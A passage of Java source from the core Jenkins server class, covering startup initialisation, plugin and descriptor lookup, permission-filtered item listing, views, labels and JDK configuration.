/**\n     * Name of the primary view.\n     * <p>\n     * Start with null, so that we can upgrade pre-1.269 data well.\n     * @since 1.269\n     */\n    private volatile String primaryView;\n\n    private transient final ViewGroupMixIn viewGroupMixIn = new ViewGroupMixIn(this) {\n        protected List<View> views() { return views; }\n        protected String primaryView() { return primaryView; }\n        protected void primaryView(String name) { primaryView=name; }\n    };\n\n\n    private transient final FingerprintMap fingerprintMap = new FingerprintMap();\n\n    /**\n     * Loaded plugins.\n     */\n    public transient final PluginManager pluginManager;\n\n    public transient volatile TcpSlaveAgentListener tcpSlaveAgentListener;\n\n    private transient UDPBroadcastThread udpBroadcastThread;\n\n    private transient DNSMultiCast dnsMultiCast;\n\n    /**\n     * List of registered {@link SCMListener}s.\n     */\n    private transient final CopyOnWriteList<SCMListener> scmListeners = new CopyOnWriteList<SCMListener>();\n\n    /**\n     * TCP slave agent port.\n     * 0 for random, -1 to disable.\n     */\n    private int slaveAgentPort =0;\n\n    /**\n     * Whitespace-separated labels assigned to the master as a {@link Node}.\n     */\n    private String label=\"\";\n\n    /**\n     * {@link hudson.security.csrf.CrumbIssuer}\n     */\n    private volatile CrumbIssuer crumbIssuer;\n\n    /**\n     * All labels known to Jenkins. This allows us to reuse the same label instances\n     * as much as possible, even though that's not a strict requirement.\n     */\n    private transient final ConcurrentHashMap<String,Label> labels = new ConcurrentHashMap<String,Label>();\n\n    /**\n     * Load statistics of the entire system.\n     *\n     * This includes every executor and every job in the system.\n     */\n    @Exported\n    public transient final OverallLoadStatistics overallLoad = new OverallLoadStatistics();\n\n    /**\n     * Load statistics of the free roaming jobs and slaves.\n     * \n     * This includes all executors on {@link Mode#NORMAL} nodes and jobs that do not have any assigned nodes.\n     *\n     * @since 1.467\n     */\n    @Exported\n    public transient final LoadStatistics unlabeledLoad = new UnlabeledLoadStatistics();\n\n    /**\n     * {@link NodeProvisioner} that reacts to {@link #unlabeledLoad}.\n     * @since 1.467\n     */\n    public transient final NodeProvisioner unlabeledNodeProvisioner = new NodeProvisioner(null,unlabeledLoad);\n\n    /**\n     * @deprecated as of 1.467\n     *      Use {@link #unlabeledNodeProvisioner}.\n     *      This was broken because it was tracking all the executors in the system, but it was only tracking\n     *      free-roaming jobs in the queue. So {@link Cloud} fails to launch nodes when you have some exclusive\n     *      slaves and free-roaming jobs in the queue.\n     */\n    @Restricted(NoExternalUse.class)\n    public transient final NodeProvisioner overallNodeProvisioner = unlabeledNodeProvisioner;\n\n\n    public transient final ServletContext servletContext;\n\n    /**\n     * Transient action list. Useful for adding navigation items to the navigation bar\n     * on the left.\n     */\n    private transient final List<Action> actions = new CopyOnWriteArrayList<Action>();\n\n    /**\n     * List of master node properties\n     */\n    private DescribableList<NodeProperty<?>,NodePropertyDescriptor> nodeProperties = new DescribableList<NodeProperty<?>,NodePropertyDescriptor>(this);\n\n    /**\n     * List of global properties\n     */\n    private DescribableList<NodeProperty<?>,NodePropertyDescriptor> globalNodeProperties = new DescribableList<NodeProperty<?>,NodePropertyDescriptor>(this);\n\n    /**\n     * {@link AdministrativeMonitor}s installed on this system.\n     *\n     * @see AdministrativeMonitor\n     */\n    public transient final List<AdministrativeMonitor> administrativeMonitors = getExtensionList(AdministrativeMonitor.class);\n\n    /**\n     * Widgets on Hudson.\n     */\n    private transient final List<Widget> widgets = getExtensionList(Widget.class);\n\n    /**\n     * {@link AdjunctManager}\n     */\n    private transient final AdjunctManager adjuncts;\n\n    /**\n     * Code that handles {@link ItemGroup} work.\n     */\n    private transient final ItemGroupMixIn itemGroupMixIn = new ItemGroupMixIn(this,this) {\n        @Override\n        protected void add(TopLevelItem item) {\n            items.put(item.getName(),item);\n        }\n\n        @Override\n        protected File getRootDirFor(String name) {\n            return Jenkins.this.getRootDirFor(name);\n        }\n\n        /**\n         * Send the browser to the config page.\n         * use View to trim view/{default-view} from URL if possible\n         */\n        @Override\n        protected String redirectAfterCreateItem(StaplerRequest req, TopLevelItem result) throws IOException {\n            String redirect = result.getUrl()+\"configure\";\n            List<Ancestor> ancestors = req.getAncestors();\n            for (int i = ancestors.size() - 1; i >= 0; i--) {\n                Object o = ancestors.get(i).getObject();\n                if (o instanceof View) {\n                    redirect = req.getContextPath() + '/' + ((View)o).getUrl() + redirect;\n                    break;\n                }\n            }\n            return redirect;\n        }\n    };\n\n\n    /**\n     * Hook for a test harness to intercept Jenkins.getInstance()\n     *\n     * Do not use in the production code as the signature may change.\n     */\n    public interface JenkinsHolder {\n        Jenkins getInstance();\n    }\n\n    static JenkinsHolder HOLDER = new JenkinsHolder() {\n        public Jenkins getInstance() {\n            return theInstance;\n        }\n    };\n\n    @CLIResolver\n    public static Jenkins getInstance() {\n        return HOLDER.getInstance();\n    }\n\n    /**\n     * Secret key generated once and used for a long time, beyond\n     * container start/stop. Persisted outside <tt>config.xml</tt> to avoid\n     * accidental exposure.\n     */\n    private transient final String secretKey;\n\n    private transient final UpdateCenter updateCenter = new UpdateCenter();\n\n    /**\n     * True if the user opted out from the statistics tracking. We'll never send anything if this is true.\n     */\n    private Boolean noUsageStatistics;\n\n    /**\n     * HTTP proxy configuration.\n     */\n    public transient volatile ProxyConfiguration proxy;\n\n    /**\n     * Bound to \"/log\".\n     */\n    private transient final LogRecorderManager log = new LogRecorderManager();\n\n    protected Jenkins(File root, ServletContext context) throws IOException, InterruptedException, ReactorException {\n        this(root,context,null);\n    }\n\n    /**\n     * @param pluginManager\n     *      If non-null, use existing plugin manager.  create a new one.\n     */\n    @edu.umd.cs.findbugs.annotations.SuppressWarnings({\n        \"SC_START_IN_CTOR\", // bug in FindBugs. It flags UDPBroadcastThread.start() call but that's for another class\n        \"ST_WRITE_TO_STATIC_FROM_INSTANCE_METHOD\" // Trigger.timer\n    })\n    protected Jenkins(File root, ServletContext context, PluginManager pluginManager) throws IOException, InterruptedException, ReactorException {\n        long start = System.currentTimeMillis();\n        \n    \t// As Jenkins is starting, grant this process full control\n        ACL.impersonate(ACL.SYSTEM);\n        try {\n            this.root = root;\n            this.servletContext = context;\n            computeVersion(context);\n            if(theInstance!=null)\n                throw new IllegalStateException(\"second instance\");\n            theInstance = this;\n\n            if (!new File(root,\"jobs\").exists()) {\n                // if this is a fresh install, use more modern default layout that's consistent with slaves\n                workspaceDir = \"${JENKINS_HOME}/workspace/${ITEM_FULLNAME}\";\n            }\n\n            // doing this early allows InitStrategy to set environment upfront\n            final InitStrategy is = InitStrategy.get(Thread.currentThread().getContextClassLoader());\n\n            Trigger.timer = new Timer(\"Jenkins cron thread\");\n            queue = new Queue(LoadBalancer.CONSISTENT_HASH);\n\n            try {\n                dependencyGraph = DependencyGraph.EMPTY;\n            } catch (InternalError e) {\n                if(e.getMessage().contains(\"window server\")) {\n                    throw new Error(\"Looks like the server runs without X. Please specify -Djava.awt.headless=true as JVM option\",e);\n                }\n                throw e;\n            }\n\n            // get or create the secret\n            TextFile secretFile = new TextFile(new File(getRootDir(),\"secret.key\"));\n            if(secretFile.exists()) {\n                secretKey = secretFile.readTrim();\n            } else {\n                SecureRandom sr = new SecureRandom();\n                byte[] random = new byte[32];\n                sr.nextBytes(random);\n                secretKey = Util.toHexString(random);\n                secretFile.write(secretKey);\n            }\n\n            try {\n                proxy = ProxyConfiguration.load();\n            } catch (IOException e) {\n                LOGGER.log(SEVERE, \"Failed to load proxy configuration\", e);\n            }\n\n            if (pluginManager==null)\n                pluginManager = new LocalPluginManager(this);\n            this.pluginManager = pluginManager;\n            // JSON binding needs to be able to see all the classes from all the plugins\n            WebApp.get(servletContext).setClassLoader(pluginManager.uberClassLoader);\n\n            adjuncts = new AdjunctManager(servletContext, pluginManager.uberClassLoader,\"adjuncts/\"+SESSION_HASH);\n\n            // initialization consists of ...\n            executeReactor( is,\n                    pluginManager.initTasks(is),    // loading and preparing plugins\n                    loadTasks(),                    // load jobs\n                    InitMilestone.ordering()        // forced ordering among key milestones\n            );\n\n            if(KILL_AFTER_LOAD)\n                System.exit(0);\n\n            if(slaveAgentPort!=-1) {\n                try {\n                    tcpSlaveAgentListener = new TcpSlaveAgentListener(slaveAgentPort);\n                } catch (BindException e) {\n                    new AdministrativeError(getClass().getName()+\".tcpBind\",\n                            \"Failed to listen to incoming slave connection\",\n                            \"Failed to listen to incoming slave connection. <a href='configure'>Change the port number</a> to solve the problem.\",e);\n                }\n            } else\n                tcpSlaveAgentListener = null;\n\n            try {\n                udpBroadcastThread = new UDPBroadcastThread(this);\n                udpBroadcastThread.start();\n            } catch (IOException e) {\n                LOGGER.log(Level.WARNING, \"Failed to broadcast over UDP\",e);\n            }\n            dnsMultiCast = new DNSMultiCast(this);\n\n            Timer timer = Trigger.timer;\n            if (timer != null) {\n                timer.scheduleAtFixedRate(new SafeTimerTask() {\n                    @Override\n                    protected void doRun() throws Exception {\n                        trimLabels();\n                    }\n                }, TimeUnit2.MINUTES.toMillis(5), TimeUnit2.MINUTES.toMillis(5));\n            }\n\n            updateComputerList();\n\n            {// master is online now\n                Computer c = toComputer();\n                if(c!=null)\n                    for (ComputerListener cl : ComputerListener.all())\n                        cl.onOnline(c,StreamTaskListener.fromStdout());\n            }\n\n            for (ItemListener l : ItemListener.all()) {\n                long itemListenerStart = System.currentTimeMillis();\n                l.onLoaded();\n                if (LOG_STARTUP_PERFORMANCE)\n                    LOGGER.info(String.format(\"Took %dms for item listener %s startup\",\n                            System.currentTimeMillis()-itemListenerStart,l.getClass().getName()));\n            }\n            \n            if (LOG_STARTUP_PERFORMANCE)\n                LOGGER.info(String.format(\"Took %dms for complete Jenkins startup\",\n                        System.currentTimeMillis()-start));\n        } finally {\n            SecurityContextHolder.clearContext();\n        }\n    }\n\n    /**\n     * Executes a reactor.\n     *\n     * @param is\n     *      If non-null, this can be consulted for ignoring some tasks. Only used during the initialization of Hudson.\n     */\n    private void executeReactor(final InitStrategy is, TaskBuilder... builders) throws IOException, InterruptedException, ReactorException {\n        Reactor reactor = new Reactor(builders) {\n            /**\n             * Sets the thread name to the task for better diagnostics.\n             */\n            @Override\n            protected void runTask(Task task) throws Exception {\n                if (is!=null && is.skipInitTask(task))  return;\n\n                ACL.impersonate(ACL.SYSTEM); // full access in the initialization thread\n                String taskName = task.getDisplayName();\n\n                Thread t = Thread.currentThread();\n                String name = t.getName();\n                if (taskName !=null)\n                    t.setName(taskName);\n                try {\n                    long start = System.currentTimeMillis();\n                    super.runTask(task);\n                    if(LOG_STARTUP_PERFORMANCE)\n                        LOGGER.info(String.format(\"Took %dms for %s by %s\",\n                                System.currentTimeMillis()-start, taskName, name));\n                } finally {\n                    t.setName(name);\n                    SecurityContextHolder.clearContext();\n                }\n            }\n        };\n\n        new InitReactorRunner() {\n            @Override\n            protected void onInitMilestoneAttained(InitMilestone milestone) {\n                initLevel = milestone;\n            }\n        }.run(reactor);\n    }\n\n\n    public TcpSlaveAgentListener getTcpSlaveAgentListener() {\n        return tcpSlaveAgentListener;\n    }\n\n    /**\n     * Makes {@link AdjunctManager} URL-bound.\n     * The dummy parameter allows us to use different URLs for the same adjunct,\n     * for proper cache handling.\n     */\n    public AdjunctManager getAdjuncts(String dummy) {\n        return adjuncts;\n    }\n\n    @Exported\n    public int getSlaveAgentPort() {\n        return slaveAgentPort;\n    }\n\n    /**\n     * @param port\n     *      0 to indicate random available TCP port. -1 to disable this service.\n     */\n    public void setSlaveAgentPort(int port) throws IOException {\n        this.slaveAgentPort = port;\n\n        // relaunch the agent\n        if(tcpSlaveAgentListener==null) {\n            if(slaveAgentPort!=-1)\n                tcpSlaveAgentListener = new TcpSlaveAgentListener(slaveAgentPort);\n        } else {\n            if(tcpSlaveAgentListener.configuredPort!=slaveAgentPort) {\n                tcpSlaveAgentListener.shutdown();\n                tcpSlaveAgentListener = null;\n                if(slaveAgentPort!=-1)\n                    tcpSlaveAgentListener = new TcpSlaveAgentListener(slaveAgentPort);\n            }\n        }\n    }\n\n    public void setNodeName(String name) {\n        throw new UnsupportedOperationException(); // not allowed\n    }\n\n    public String getNodeDescription() {\n        return Messages.Hudson_NodeDescription();\n    }\n\n    @Exported\n    public String getDescription() {\n        return systemMessage;\n    }\n\n    public PluginManager getPluginManager() {\n        return pluginManager;\n    }\n\n    public UpdateCenter getUpdateCenter() {\n        return updateCenter;\n    }\n\n    public boolean isUsageStatisticsCollected() {\n        return noUsageStatistics==null || !noUsageStatistics;\n    }\n\n    public void setNoUsageStatistics(Boolean noUsageStatistics) throws IOException {\n        this.noUsageStatistics = noUsageStatistics;\n        save();\n    }\n\n    public View.People getPeople() {\n        return new View.People(this);\n    }\n\n    /**\n     * @since 1.484\n     */\n    public View.AsynchPeople getAsynchPeople() {\n        return new View.AsynchPeople(this);\n    }\n\n    /**\n     * Does this {@link View} has any associated user information recorded?\n     */\n    public boolean hasPeople() {\n        return View.People.isApplicable(items.values());\n    }\n\n    public Api getApi() {\n        return new Api(this);\n    }\n\n    /**\n     * Returns a secret key that survives across container start/stop.\n     * <p>\n     * This value is useful for implementing some of the security features.\n     *\n     * @deprecated\n     *      Due to the past security advisory, this value should not be used any more to protect sensitive information.\n     *      See {@link ConfidentialStore} and {@link ConfidentialKey} for how to store secrets.\n     */\n    public String getSecretKey() {\n        return secretKey;\n    }\n\n    /**\n     * Gets {@linkplain #getSecretKey() the secret key} as a key for AES-128.\n     * @since 1.308\n     * @deprecated\n     *       See {@link #getSecretKey()}.\n     */\n    public SecretKey getSecretKeyAsAES128() {\n        return Util.toAes128Key(secretKey);\n    }\n\n    /**\n     * Returns the unique identifier of this Jenkins that has been historically used to identify\n     * this Jenkins to the outside world.\n     *\n     * <p>\n     * This form of identifier is weak in that it can be impersonated by others. See\n     * https://wiki.jenkins-ci.org/display/JENKINS/Instance+Identity for more modern form of instance ID\n     * that can be challenged and verified.\n     *\n     * @since 1.498\n     */\n    @SuppressWarnings(\"deprecation\")\n    public String getLegacyInstanceId() {\n        return Util.getDigestOf(getSecretKey());\n    }\n\n    /**\n     * Gets the SCM descriptor by name. Primarily used for making them web-visible.\n     */\n    public Descriptor<SCM> getScm(String shortClassName) {\n        return findDescriptor(shortClassName,SCM.all());\n    }\n\n    /**\n     * Gets the repository browser descriptor by name. Primarily used for making them web-visible.\n     */\n    public Descriptor<RepositoryBrowser<?>> getRepositoryBrowser(String shortClassName) {\n        return findDescriptor(shortClassName,RepositoryBrowser.all());\n    }\n\n    /**\n     * Gets the builder descriptor by name. Primarily used for making them web-visible.\n     */\n    public Descriptor<Builder> getBuilder(String shortClassName) {\n        return findDescriptor(shortClassName, Builder.all());\n    }\n\n    /**\n     * Gets the build wrapper descriptor by name. Primarily used for making them web-visible.\n     */\n    public Descriptor<BuildWrapper> getBuildWrapper(String shortClassName) {\n        return findDescriptor(shortClassName, BuildWrapper.all());\n    }\n\n    /**\n     * Gets the publisher descriptor by name. Primarily used for making them web-visible.\n     */\n    public Descriptor<Publisher> getPublisher(String shortClassName) {\n        return findDescriptor(shortClassName, Publisher.all());\n    }\n\n    /**\n     * Gets the trigger descriptor by name. Primarily used for making them web-visible.\n     */\n    public TriggerDescriptor getTrigger(String shortClassName) {\n        return (TriggerDescriptor) findDescriptor(shortClassName, Trigger.all());\n    }\n\n    /**\n     * Gets the retention strategy descriptor by name. Primarily used for making them web-visible.\n     */\n    public Descriptor<RetentionStrategy<?>> getRetentionStrategy(String shortClassName) {\n        return findDescriptor(shortClassName, RetentionStrategy.all());\n    }\n\n    /**\n     * Gets the {@link JobPropertyDescriptor} by name. Primarily used for making them web-visible.\n     */\n    public JobPropertyDescriptor getJobProperty(String shortClassName) {\n        // combining these two lines triggers javac bug. See issue #610.\n        Descriptor d = findDescriptor(shortClassName, JobPropertyDescriptor.all());\n        return (JobPropertyDescriptor) d;\n    }\n\n    /**\n     * @deprecated\n     *      UI method. Not meant to be used programatically.\n     */\n    public ComputerSet getComputer() {\n        return new ComputerSet();\n    }\n\n    /**\n     * Exposes {@link Descriptor} by its name to URL.\n     *\n     * After doing all the {@code getXXX(shortClassName)} methods, I finally realized that\n     * this just doesn't scale.\n     *\n     * @param id\n     *      Either {@link Descriptor#getId()} (recommended) or the short name of a {@link Describable} subtype (for compatibility)\n     * @throws IllegalArgumentException if a short name was passed which matches multiple IDs (fail fast)\n     */\n    @SuppressWarnings({\"unchecked\", \"rawtypes\"}) // too late to fix\n    public Descriptor getDescriptor(String id) {\n        // legacy descriptors that are reigstered manually doesn't show up in getExtensionList, so check them explicitly.\n        Iterable<Descriptor> descriptors = Iterators.sequence(getExtensionList(Descriptor.class), DescriptorExtensionList.listLegacyInstances());\n        for (Descriptor d : descriptors) {\n            if (d.getId().equals(id)) {\n                return d;\n            }\n        }\n        Descriptor candidate = null;\n        for (Descriptor d : descriptors) {\n            String name = d.getId();\n            if (name.substring(name.lastIndexOf('.') + 1).equals(id)) {\n                if (candidate == null) {\n                    candidate = d;\n                } else {\n                    throw new IllegalArgumentException(id + \" is ambiguous; matches both \" + name + \" and \" + candidate.getId());\n                }\n            }\n        }\n        return candidate;\n    }\n\n    /**\n     * Alias for {@link #getDescriptor(String)}.\n     */\n    public Descriptor getDescriptorByName(String id) {\n        return getDescriptor(id);\n    }\n\n    /**\n     * Gets the {@link Descriptor} that corresponds to the given {@link Describable} type.\n     * <p>\n     * If you have an instance of {@code type} and call {@link Describable#getDescriptor()},\n     * you'll get the same instance that this method returns.\n     */\n    public Descriptor getDescriptor(Class<? extends Describable> type) {\n        for( Descriptor d : getExtensionList(Descriptor.class) )\n            if(d.clazz==type)\n                return d;\n        return null;\n    }\n\n    /**\n     * Works just like {@link #getDescriptor(Class)} but don't take no for an answer.\n     *\n     * @throws AssertionError\n     *      If the descriptor is missing.\n     * @since 1.326\n     */\n    public Descriptor getDescriptorOrDie(Class<? extends Describable> type) {\n        Descriptor d = getDescriptor(type);\n        if (d==null)\n            throw new AssertionError(type+\" is missing its descriptor\");\n        return d;\n    }\n\n    /**\n     * Gets the {@link Descriptor} instance in the current Hudson by its type.\n     */\n    public <T extends Descriptor> T getDescriptorByType(Class<T> type) {\n        for( Descriptor d : getExtensionList(Descriptor.class) )\n            if(d.getClass()==type)\n                return type.cast(d);\n        return null;\n    }\n\n    /**\n     * Gets the {@link SecurityRealm} descriptors by name. Primarily used for making them web-visible.\n     */\n    public Descriptor<SecurityRealm> getSecurityRealms(String shortClassName) {\n        return findDescriptor(shortClassName,SecurityRealm.all());\n    }\n\n    /**\n     * Finds a descriptor that has the specified name.\n     */\n    private <T extends Describable<T>>\n    Descriptor<T> findDescriptor(String shortClassName, Collection<? extends Descriptor<T>> descriptors) {\n        String name = '.'+shortClassName;\n        for (Descriptor<T> d : descriptors) {\n            if(d.clazz.getName().endsWith(name))\n                return d;\n        }\n        return null;\n    }\n\n    protected void updateComputerList() throws IOException {\n        updateComputerList(AUTOMATIC_SLAVE_LAUNCH);\n    }\n\n    /**\n     * Gets all the installed {@link SCMListener}s.\n     */\n    public CopyOnWriteList<SCMListener> getSCMListeners() {\n        return scmListeners;\n    }\n\n    /**\n     * Gets the plugin object from its short name.\n     *\n     * <p>\n     * This allows URL <tt>hudson/plugin/ID</tt> to be served by the views\n     * of the plugin class.\n     */\n    public Plugin getPlugin(String shortName) {\n        PluginWrapper p = pluginManager.getPlugin(shortName);\n        if(p==null)     return null;\n        return p.getPlugin();\n    }\n\n    /**\n     * Gets the plugin object from its class.\n     *\n     * <p>\n     * This allows easy storage of plugin information in the plugin singleton without\n     * every plugin reimplementing the singleton pattern.\n     *\n     * @param clazz The plugin class (beware class-loader fun, this will probably only work\n     * from within the jpi that defines the plugin class, it may or may not work in other cases)\n     *\n     * @return The plugin instance.\n     */\n    @SuppressWarnings(\"unchecked\")\n    public <P extends Plugin> P getPlugin(Class<P> clazz) {\n        PluginWrapper p = pluginManager.getPlugin(clazz);\n        if(p==null)     return null;\n        return (P) p.getPlugin();\n    }\n\n    /**\n     * Gets the plugin objects from their super-class.\n     *\n     * @param clazz The plugin class (beware class-loader fun)\n     *\n     * @return The plugin instances.\n     */\n    public <P extends Plugin> List<P> getPlugins(Class<P> clazz) {\n        List<P> result = new ArrayList<P>();\n        for (PluginWrapper w: pluginManager.getPlugins(clazz)) {\n            result.add((P)w.getPlugin());\n        }\n        return Collections.unmodifiableList(result);\n    }\n\n    /**\n     * Synonym for {@link #getDescription}.\n     */\n    public String getSystemMessage() {\n        return systemMessage;\n    }\n\n    /**\n     * Gets the markup formatter used in the system.\n     *\n     * @return\n     *      never null.\n     * @since 1.391\n     */\n    public MarkupFormatter getMarkupFormatter() {\n        return markupFormatter!=null ? markupFormatter : RawHtmlMarkupFormatter.INSTANCE;\n    }\n\n    /**\n     * Sets the markup formatter used in the system globally.\n     *\n     * @since 1.391\n     */\n    public void setMarkupFormatter(MarkupFormatter f) {\n        this.markupFormatter = f;\n    }\n\n    /**\n     * Sets the system message.\n     */\n    public void setSystemMessage(String message) throws IOException {\n        this.systemMessage = message;\n        save();\n    }\n\n    public FederatedLoginService getFederatedLoginService(String name) {\n        for (FederatedLoginService fls : FederatedLoginService.all()) {\n            if (fls.getUrlName().equals(name))\n                return fls;\n        }\n        return null;\n    }\n\n    public List<FederatedLoginService> getFederatedLoginServices() {\n        return FederatedLoginService.all();\n    }\n\n    public Launcher createLauncher(TaskListener listener) {\n        return new LocalLauncher(listener).decorateFor(this);\n    }\n\n\n    public String getFullName() {\n        return \"\";\n    }\n\n    public String getFullDisplayName() {\n        return \"\";\n    }\n\n    /**\n     * Returns the transient {@link Action}s associated with the top page.\n     *\n     * <p>\n     * Adding {@link Action} is primarily useful for plugins to contribute\n     * an item to the navigation bar of the top page. See existing {@link Action}\n     * implementation for it affects the GUI.\n     *\n     * <p>\n     * To register an {@link Action}, implement {@link RootAction} extension point, or write code like\n     * {@code Hudson.getInstance().getActions().add(...)}.\n     *\n     * @return\n     *      Live list where the changes can be made. Can be empty but never null.\n     * @since 1.172\n     */\n    public List<Action> getActions() {\n        return actions;\n    }\n\n    /**\n     * Gets just the immediate children of {@link Jenkins}.\n     *\n     * @see #getAllItems(Class)\n     */\n    @Exported(name=\"jobs\")\n    public List<TopLevelItem> getItems() {\n\t\tif (authorizationStrategy instanceof AuthorizationStrategy.Unsecured ||\n\t\t\tauthorizationStrategy instanceof FullControlOnceLoggedInAuthorizationStrategy) {\n\t\t\treturn new ArrayList(items.values());\n\t\t}\n\n        List<TopLevelItem> viewableItems = new ArrayList<TopLevelItem>();\n        for (TopLevelItem item : items.values()) {\n            if (item.hasPermission(Item.READ))\n                viewableItems.add(item);\n        }\n\t\t\n        return viewableItems;\n    }\n\n    /**\n     * Returns the read-only view of all the {@link TopLevelItem}s keyed by their names.\n     * <p>\n     * This method is efficient, as it doesn't involve any copying.\n     *\n     * @since 1.296\n     */\n    public Map<String,TopLevelItem> getItemMap() {\n        return Collections.unmodifiableMap(items);\n    }\n\n    /**\n     * Gets just the immediate children of {@link Jenkins} but of the given type.\n     */\n    public <T> List<T> getItems(Class<T> type) {\n        List<T> r = new ArrayList<T>();\n        for (TopLevelItem i : getItems())\n            if (type.isInstance(i))\n                 r.add(type.cast(i));\n        return r;\n    }\n\n    /**\n     * Gets all the {@link Item}s recursively in the {@link ItemGroup} tree\n     * and filter them by the given type.\n     */\n    public <T extends Item> List<T> getAllItems(Class<T> type) {\n        List<T> r = new ArrayList<T>();\n\n        Stack<ItemGroup> q = new Stack<ItemGroup>();\n        q.push(this);\n\n        while(!q.isEmpty()) {\n            ItemGroup<?> parent = q.pop();\n            for (Item i : parent.getItems()) {\n                if(type.isInstance(i)) {\n                    if (i.hasPermission(Item.READ))\n                        r.add(type.cast(i));\n                }\n                if(i instanceof ItemGroup)\n                    q.push((ItemGroup)i);\n            }\n        }\n\n        return r;\n    }\n\n    /**\n     * Gets all the items recursively.\n     *\n     * @since 1.402\n     */\n    public List<Item> getAllItems() {\n        return getAllItems(Item.class);\n    }\n\n    /**\n     * Gets a list of simple top-level projects.\n     * @deprecated This method will ignore Maven and matrix projects, as well as projects inside containers such as folders.\n     * You may prefer to call {@link #getAllItems(Class)} on {@link AbstractProject},\n     * perhaps also using {@link Util#createSubList} to consider only {@link TopLevelItem}s.\n     * (That will also consider the caller's permissions.)\n     * If you really want to get just {@link Project}s at top level, ignoring permissions,\n     * you can filter the values from {@link #getItemMap} using {@link Util#createSubList}.\n     */\n    @Deprecated\n    public List<Project> getProjects() {\n        return Util.createSubList(items.values(),Project.class);\n    }\n\n    /**\n     * Gets the names of all the {@link Job}s.\n     */\n    public Collection<String> getJobNames() {\n        List<String> names = new ArrayList<String>();\n        for (Job j : getAllItems(Job.class))\n            names.add(j.getFullName());\n        return names;\n    }\n\n    public List<Action> getViewActions() {\n        return getActions();\n    }\n\n    /**\n     * Gets the names of all the {@link TopLevelItem}s.\n     */\n    public Collection<String> getTopLevelItemNames() {\n        List<String> names = new ArrayList<String>();\n        for (TopLevelItem j : items.values())\n            names.add(j.getName());\n        return names;\n    }\n\n    public View getView(String name) {\n        return viewGroupMixIn.getView(name);\n    }\n\n    /**\n     * Gets the read-only list of all {@link View}s.\n     */\n    @Exported\n    public Collection<View> getViews() {\n        return viewGroupMixIn.getViews();\n    }\n\n    public void addView(View v) throws IOException {\n        viewGroupMixIn.addView(v);\n    }\n\n    public boolean canDelete(View view) {\n        return viewGroupMixIn.canDelete(view);\n    }\n\n    public synchronized void deleteView(View view) throws IOException {\n        viewGroupMixIn.deleteView(view);\n    }\n\n    public void onViewRenamed(View view, String oldName, String newName) {\n        viewGroupMixIn.onViewRenamed(view,oldName,newName);\n    }\n\n    /**\n     * Returns the primary {@link View} that renders the top-page of Hudson.\n     */\n    @Exported\n    public View getPrimaryView() {\n        return viewGroupMixIn.getPrimaryView();\n     }\n\n    public void setPrimaryView(View v) {\n        this.primaryView = v.getViewName();\n    }\n\n    public ViewsTabBar getViewsTabBar() {\n        return viewsTabBar;\n    }\n\n    public void setViewsTabBar(ViewsTabBar viewsTabBar) {\n        this.viewsTabBar = viewsTabBar;\n    }\n\n    public Jenkins getItemGroup() {\n        return this;\n   }\n\n    public MyViewsTabBar getMyViewsTabBar() {\n        return myViewsTabBar;\n    }\n\n    public void setMyViewsTabBar(MyViewsTabBar myViewsTabBar) {\n        this.myViewsTabBar = myViewsTabBar;\n    }\n\n    /**\n     * Returns true if the current running Hudson is upgraded from a version earlier than the specified version.\n     *\n     * <p>\n     * This method continues to return true until the system configuration is saved, at which point\n     * {@link #version} will be overwritten and Hudson forgets the upgrade history.\n     *\n     * <p>\n     * To handle SNAPSHOTS correctly, pass in \"1.N.*\" to test if it's upgrading from the version\n     * equal or younger than N. So say if you implement a feature in 1.301 and you want to check\n     * if the installation upgraded from pre-1.301, pass in \"1.300.*\"\n     *\n     * @since 1.301\n     */\n    public boolean isUpgradedFromBefore(VersionNumber v) {\n        try {\n            return new VersionNumber(version).isOlderThan(v);\n        } catch (IllegalArgumentException e) {\n            // fail to parse this version number\n            return false;\n        }\n    }\n\n    /**\n     * Gets the read-only list of all {@link Computer}s.\n     */\n    public Computer[] getComputers() {\n        Computer[] r = computers.values().toArray(new Computer[computers.size()]);\n        Arrays.sort(r,new Comparator<Computer>() {\n            final Collator collator = Collator.getInstance();\n            public int compare(Computer lhs, Computer rhs) {\n                if(lhs.getNode()==Jenkins.this)  return -1;\n                if(rhs.getNode()==Jenkins.this)  return 1;\n                return collator.compare(lhs.getDisplayName(), rhs.getDisplayName());\n            }\n        });\n        return r;\n    }\n\n    @CLIResolver\n    public Computer getComputer(@Argument(required=true,metaVar=\"NAME\",usage=\"Node name\") String name) {\n        if(name.equals(\"(master)\"))\n            name = \"\";\n\n        for (Computer c : computers.values()) {\n            if(c.getName().equals(name))\n                return c;\n        }\n        return null;\n    }\n\n    /**\n     * Gets the label that exists on this system by the name.\n     *\n     * @return null if name is null.\n     * @see Label#parseExpression(String) (String)\n     */\n    public Label getLabel(String expr) {\n        if(expr==null)  return null;\n        while(true) {\n            Label l = labels.get(expr);\n            if(l!=null)\n                return l;\n\n            // non-existent\n            try {\n                labels.putIfAbsent(expr,Label.parseExpression(expr));\n            } catch (ANTLRException e) {\n                // laxly accept it as a single label atom for backward compatibility\n                return getLabelAtom(expr);\n            }\n        }\n    }\n\n    /**\n     * Returns the label atom of the given name.\n     * @return non-null iff name is non-null\n     */\n    public @Nullable LabelAtom getLabelAtom(@CheckForNull String name) {\n        if (name==null)  return null;\n\n        while(true) {\n            Label l = labels.get(name);\n            if(l!=null)\n                return (LabelAtom)l;\n\n            // non-existent\n            LabelAtom la = new LabelAtom(name);\n            if (labels.putIfAbsent(name, la)==null)\n                la.load();\n        }\n    }\n\n    /**\n     * Gets all the active labels in the current system.\n     */\n    public Set<Label> getLabels() {\n        Set<Label> r = new TreeSet<Label>();\n        for (Label l : labels.values()) {\n            if(!l.isEmpty())\n                r.add(l);\n        }\n        return r;\n    }\n\n    public Set<LabelAtom> getLabelAtoms() {\n        Set<LabelAtom> r = new TreeSet<LabelAtom>();\n        for (Label l : labels.values()) {\n            if(!l.isEmpty() && l instanceof LabelAtom)\n                r.add((LabelAtom)l);\n        }\n        return r;\n    }\n\n    public Queue getQueue() {\n        return queue;\n    }\n\n    @Override\n    public String getDisplayName() {\n        return Messages.Hudson_DisplayName();\n    }\n\n    public List<JDK> getJDKs() {\n        if(jdks==null)\n            jdks = new ArrayList<JDK>();\n        return jdks;\n    }\n\n    /**\n     * Gets the JDK installation of the given name, or returns null.\n     */\n    public JDK getJDK(String name) {\n        if(name==null) {\n            // if only one JDK is configured, \"default JDK\" should mean that JDK.\n            List<JDK> jdks = getJDKs();\n            if(jdks.size()==1)  return jdks.get(0);\n            return null;\n        }\n        for (JDK j : getJDKs()) {\n            if(j.getName().equals(name))\n                return j;\n        }\n        return null;\n    }\n\n\n\n    /**\n     * Gets the slave node of the 